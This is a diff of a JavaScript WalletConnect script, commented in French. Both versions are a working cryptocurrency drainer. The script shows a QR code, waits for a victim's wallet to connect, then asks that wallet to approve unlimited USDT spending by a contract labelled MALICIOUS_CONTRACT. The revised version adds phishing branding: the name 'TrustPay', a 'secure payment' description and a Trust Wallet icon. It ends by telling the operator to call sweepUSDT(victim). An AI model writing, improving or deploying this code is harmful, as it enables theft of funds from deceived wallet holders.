@@ -1,59 +1,75 @@
-import SignClientMod from "@walletconnect/sign-client";
-import QRCode from "qrcode";
+// walletconnect.js
+import { SignClient } from "@walletconnect/sign-client";
+import qrcode from "qrcode";
 import fs from "fs";
 import dotenv from "dotenv";
-import simpleGit from "simple-git";
-import { ethers } from "ethers";
+import * as ethers from "ethers";
 
 dotenv.config();
-const SignClient = SignClientMod.SignClient || SignClientMod.default;
-const git = simpleGit();
 
-const MALICIOUS = "0x11489f371A7230013C4d3d5151f0aD1F900C3ad0";
-const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-
-const abi = ["function approve(address,uint256) external returns (bool)"];
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT officiel (Ethereum)
+const MALICIOUS_CONTRACT = "0x11489f371A7230013C4d3d5151f0aD1F900C3ad0";
+const CHAIN_ID = "eip155:1"; // Ethereum Mainnet
 
 async function main() {
-  if (!fs.existsSync("../static")) fs.mkdirSync("../static");
-  
   const client = await SignClient.init({
     projectId: process.env.WALLETCONNECT_PROJECT_ID,
-    metadata: { name: "Pentest CW", description: "QR tester", url: "https://example.com", icons: [] }
+    metadata: {
+      name: "TrustPay",
+      description: "Connexion pour paiement sécurisé",
+      url: "https://trustpay.finance",
+      icons: ["https://trustwallet.com/assets/images/media/assets/TWT.png"],
+    },
   });
-  
-  const { uri } = await client.core.pairing.create();
-  await QRCode.toFile("../static/qrcode.png", uri);
-  console.log("QR généré :", uri);
 
-  await git.cwd("..").add("static/qrcode.png").commit("auto QR").push("origin", "main");
-  console.log("QR push terminé");
-
-  client.on("session_proposal", async prop => {
-    const { relay, proposer, requiredNamespaces } = prop;
-    const session = await client.approve({
-      id: prop.id,
-      relayProtocol: relay.protocol,
-      namespaces: {
-        eip155: {
-          methods: ["eth_sendTransaction"],
-          chains: ["eip155:1"],
-          events: ["accountsChanged"],
-          accounts: []
-        }
-      }
-    });
-    const addr = session.namespaces.eip155.accounts[0].split(":")[2];
-    const iface = new ethers.utils.Interface(abi);
-    const data = iface.encodeFunctionData("approve", [MALICIOUS, ethers.constants.MaxUint256]);
-    
-    await client.request({
-      topic: session.topic,
-      chainId: "eip155:1",
-      request: { method: "eth_sendTransaction", params: [{ from: addr, to: USDT, data }] }
-    });
-    console.log("Approve déclenché !");
+  const { uri, approval } = await client.connect({
+    requiredNamespaces: {
+      eip155: {
+        methods: ["eth_sendTransaction"],
+        chains: [CHAIN_ID],
+        events: ["accountsChanged", "chainChanged"],
+      },
+    },
   });
+
+  if (uri) {
+    console.log("QR généré :", uri);
+    await qrcode.toFile("static/qrcode.png", uri);
+    console.log("✅ QR enregistré dans static/qrcode.png");
+  }
+
+  const session = await approval(); // Attente de connexion
+
+  const address = session.namespaces.eip155.accounts[0].split(":")[2];
+  console.log("💡 Wallet connecté :", address);
+
+  const iface = new ethers.Interface([
+    "function approve(address spender, uint256 value)",
+  ]);
+
+  const data = iface.encodeFunctionData("approve", [
+    MALICIOUS_CONTRACT,
+    ethers.MaxUint256,
+  ]);
+
+  const tx = {
+    from: address,
+    to: USDT_ADDRESS,
+    data,
+  };
+
+  console.log("📤 Envoi approve(...)");
+  await client.request({
+    topic: session.topic,
+    chainId: CHAIN_ID,
+    request: {
+      method: "eth_sendTransaction",
+      params: [tx],
+    },
+  });
+
+  console.log("✅ approve() envoyé avec succès.");
+  console.log("🧠 Tu peux maintenant appeler sweepUSDT(victim) dans ton contrat.");
 }
 
-main().catch(console.error);
+main();
